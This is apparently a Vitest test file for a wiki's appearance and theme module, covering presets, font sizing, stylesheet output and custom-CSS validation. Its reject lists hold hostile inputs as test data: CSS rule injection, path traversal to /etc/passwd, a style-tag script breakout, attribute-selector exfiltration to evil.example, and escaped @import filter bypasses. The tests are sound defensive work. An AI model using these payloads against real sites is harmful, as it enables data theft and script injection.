import { existsSync, readFileSync } from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import {
  accentPair,
  appearanceFrom,
  AUTO_FACTOR_JS,
  autoFactor,
  applyPreset,
  checkCustomCss,
  DEFAULT_APPEARANCE,
  FONT_IDS,
  fontHref,
  parseAppearance,
  presetMatches,
  storedAppearance,
  THEME_PRESETS,
  themeCss,
  type Appearance,
} from "@/lib/appearance";
import fontFiles from "@/lib/font-files.json";

const root = path.resolve(import.meta.dirname, "..");
const clone = (a: Appearance): Appearance => JSON.parse(JSON.stringify(a)) as Appearance;
const withPatch = (patch: (a: Record<string, unknown>) => void) => {
  const a = clone(DEFAULT_APPEARANCE) as unknown as Record<string, unknown>;
  patch(a);
  return a;
};

describe("appearance: checking what the browser sends", () => {
  it("accepts the default, every preset, and fills in what's missing", () => {
    expect(parseAppearance(DEFAULT_APPEARANCE)).toEqual(DEFAULT_APPEARANCE);
    expect(parseAppearance({})).toEqual(DEFAULT_APPEARANCE);
    for (const p of THEME_PRESETS) {
      const a = applyPreset(DEFAULT_APPEARANCE, p);
      expect(parseAppearance(a), p.id).toEqual(a);
      expect(presetMatches(p, a)).toBe(true);
    }
    // colours are stored lower-case
    expect(parseAppearance({ accent: "#ABCDEF" })!.accent).toBe("#abcdef");
  });

  it("refuses anything that isn't exactly of the expected kind — as a whole", () => {
    const bad: Array<(a: Record<string, unknown>) => void> = [
      (a) => (a.accent = "red"),
      (a) => (a.accent = "#fff"),
      (a) => (a.accent = "#123456;}body{display:none"),
      (a) => (a.accentLight = "url(x)"),
      (a) => (a.font = "comic"),
      (a) => (a.font = "__proto__"),
      (a) => (a.customFont = 'x"; } body { display:none'),
      (a) => (a.theme = "night"),
      (a) => (a.sheetOpacity = 10),
      (a) => (a.sheetOpacity = 99.5),
      (a) => (a.sheetOpacity = "100"),
      (a) => ((a.display as Record<string, unknown>).size = 1000),
      (a) => ((a.display as Record<string, unknown>).width = "huge"),
      (a) => ((a.background as Record<string, unknown>).image = "https://evil.example/x.png"),
      (a) => ((a.background as Record<string, unknown>).image = '/media/aaaaaaaaaaaaaaaaaaaaaa.png") ;}*{x:url("'),
      (a) => ((a.background as Record<string, unknown>).image = "/media/../../etc/passwd.png"),
      (a) => ((a.background as Record<string, unknown>).image = "/media/aaaaaaaaaaaaaaaaaaaaaa.svg"),
      (a) => ((a.background as Record<string, unknown>).blur = -1),
      (a) => ((a.background as Record<string, unknown>).dim = 91),
      (a) => ((a.background as Record<string, unknown>).gradient = "rainbow"),
      (a) => ((a.background as Record<string, unknown>).imageOn = "yes"),
      (a) => ((a.band as Record<string, unknown>).light = "black"),
      (a) => (a.background = []),
      (a) => (a.band = "x"),
      (a) => (a.preset = "<script>"),
    ];
    for (const b of bad) {
      const v = withPatch(b);
      expect(parseAppearance(v), JSON.stringify(v).slice(0, 120)).toBeNull();
    }
    for (const v of [null, undefined, "x", 1, [], true]) expect(parseAppearance(v)).toBeNull();
  });

  it("an unreadable stored value falls back to the default instead of breaking every page", () => {
    expect(appearanceFrom("")).toEqual(DEFAULT_APPEARANCE);
    expect(appearanceFrom("{not json")).toEqual(DEFAULT_APPEARANCE);
    expect(appearanceFrom(JSON.stringify({ accent: "nope" }))).toEqual(DEFAULT_APPEARANCE);
  });
});

describe("appearance: size", () => {
  it("by default the wiki has the browser's own size, like every other site", () => {
    expect(DEFAULT_APPEARANCE.display).toEqual({ scale: "fixed", size: 100, width: "full" });
    expect(themeCss(DEFAULT_APPEARANCE)).toContain("font-size:calc(100% * 1)");
    expect(themeCss(DEFAULT_APPEARANCE)).not.toContain("--ui-auto");
  });

  it("'Fit the screen' only grows on screens beyond 2560 × 1440, by the smaller ratio, at most 2×", () => {
    const cases: [number, number, number][] = [
      [1366, 768, 1],
      [1920, 1080, 1],
      [2560, 1440, 1],
      [3440, 1440, 1], // ultrawide: not a large screen
      [2880, 1620, 1.13],
      [3840, 2160, 1.5],
      [7680, 4320, 2],
      [1440, 2560, 1], // portrait
      [0, 0, 1],
    ];
    const script = new Function("screen", `return ${AUTO_FACTOR_JS}`) as (s: object) => number;
    for (const [w, h, f] of cases) {
      expect(autoFactor(w, h), `${w}×${h}`).toBe(f);
      expect(script({ width: w, height: h }), `script ${w}×${h}`).toBe(f); // the pre-paint script agrees
    }
  });

  it("looks saved by 2.0/2.1 (no version) lose the enlarging 'auto' default; newer choices are kept", () => {
    const old = { ...clone(DEFAULT_APPEARANCE), display: { scale: "auto", size: 90, width: "wide" } };
    expect(appearanceFrom(JSON.stringify(old)).display).toEqual({ scale: "fixed", size: 90, width: "wide" });
    const chosen = clone(DEFAULT_APPEARANCE);
    chosen.display.scale = "auto";
    const stored = storedAppearance(chosen);
    expect(JSON.parse(stored).v).toBe(2);
    expect(appearanceFrom(stored)).toEqual(chosen);
    expect(parseAppearance(JSON.parse(stored))).toEqual(chosen); // the version isn't part of the look
  });
});

describe("appearance: the stylesheet", () => {
  it("the default look changes nothing but the font stack (Tide's hand-tuned colours stay)", () => {
    const css = themeCss(DEFAULT_APPEARANCE);
    expect(css).not.toContain("--accent:");
    expect(css).not.toContain("--bg:");
    expect(css).toContain("--sans:");
  });

  it("presets set accent, surfaces, band and gradient for both themes", () => {
    const a = applyPreset(
      DEFAULT_APPEARANCE,
      THEME_PRESETS.find((p) => p.id === "deepsea")!,
    );
    const css = themeCss(a);
    expect(css).toContain("--accent: #0e7c74"); // light theme: the hand-picked darker colour
    expect(css).toContain('html:root[data-theme="dark"]{--accent: #4fd1c5');
    expect(css).toContain("prefers-color-scheme: dark");
    expect(css).toContain("--bg: #e6f0f6");
    expect(css).toContain("--band: #020a12");
    expect(css).toContain("--gradient:");
  });

  it("a background image is only ever one of the wiki's own files", () => {
    const a = clone(DEFAULT_APPEARANCE);
    a.background = { ...a.background, imageOn: true, image: "/media/abcdefghijklmnopqrstuv.webp", blur: 8, dim: 30 };
    const css = themeCss(a);
    expect(css).toContain('url("/media/abcdefghijklmnopqrstuv.webp")');
    expect(css).toContain("filter:blur(8px)");
    expect(css).toContain("var(--bg) 30%");
    // if a bad value ever got past the check, it still wouldn't be drawn
    a.background.image = "https://evil.example/x.png";
    expect(themeCss(a)).not.toContain("evil");
  });

  it("nothing can close the <style> element, not even the owner's CSS", () => {
    const css = themeCss(DEFAULT_APPEARANCE, "a::after{content:'</style><script>alert(1)</script>'}");
    expect(css).not.toContain("<");
    expect(css).toContain("\\3c /style>");
  });

  it("the light accent is darkened until it reads on white", () => {
    const { light, lightFg, darkFg } = accentPair("#ffd319"); // bright yellow, no hand-picked pair
    const lum = (h: string) => {
      const [r, g, b] = [1, 3, 5]
        .map((i) => parseInt(h.slice(i, i + 2), 16) / 255)
        .map((c) => (c <= 0.03928 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4));
      return 0.2126 * r + 0.7152 * g + 0.0722 * b;
    };
    expect(1.05 / (lum(light) + 0.05)).toBeGreaterThanOrEqual(4.5);
    expect(lightFg).toBe("#ffffff");
    expect(darkFg).toBe("#0f1216");
  });
});

describe("appearance: the owner's CSS", () => {
  it("allows restyling, same-site images and inline images", () => {
    for (const ok of [
      "",
      ".sheet { border-radius: 4px; }\n.top { background: #123; }",
      ".sheet { background: url(/media/abcdefghijklmnopqrstuv.png) }",
      ".x { background-image: url('data:image/png;base64,iVBORw0KGgo=') }",
      "@media (max-width: 600px) { .rail { display: none } }",
      ".x { background: var(--gradient) }",
    ])
      expect(checkCustomCss(ok), ok).toBeNull();
  });

  it("refuses anything that loads from elsewhere or runs code — escapes and comments don't help", () => {
    for (const bad of [
      "@import url(https://evil.example/x.css);",
      '@import "https://evil.example/x.css";',
      "@\\69mport 'x.css';",
      "@im/**/port 'x.css';",
      "input[value^=a] { background: url(https://evil.example/?a) }",
      "input[value^=a] { background: url(//evil.example/?a) }",
      "input[value^=a] { background: u\\72l(https://evil.example/?a) }",
      "input[value^=a] { background: \\75 \\72 \\6c (https://evil.example/?a) }",
      ".x { background: image-set('https://evil.example/a.png' 1x) }",
      ".x { background: url(  'https://evil.example/a.png'  ) }",
      ".x { width: expression(alert(1)) }",
      ".x { behavior: url(x.htc) }",
      ".x { -moz-binding: url(x.xml#y) }",
      ".x { background: url(javascript:alert(1)) }",
      "@font-face { font-family: x; src: url(https://evil.example/f.woff2) }",
      "@namespace svg url(http://www.w3.org/2000/svg);",
      "a\u0000b",
      "x".repeat(50_001),
      42,
    ])
      expect(checkCustomCss(bad), String(bad).slice(0, 60)).not.toBeNull();
  });
});

describe("appearance: fonts", () => {
  it("every font with a stylesheet has one, generated into /fonts with its licence", () => {
    for (const id of FONT_IDS) {
      const href = fontHref(id);
      if (!href) continue;
      const file = path.join(root, "public", href);
      expect(existsSync(file), href).toBe(true);
      const css = readFileSync(file, "utf8");
      expect(css).toMatch(/url\(\/fonts\/[a-z0-9]+\/[\w.-]+\.woff2\?v=/);
      expect(css).not.toMatch(/url\(\.\//);
      expect(existsSync(path.join(root, "public/fonts", id, "LICENSE"))).toBe(true);
    }
    // every font file entry is a font the settings offer
    for (const id of Object.keys(fontFiles)) expect(FONT_IDS).toContain(id);
  });
});
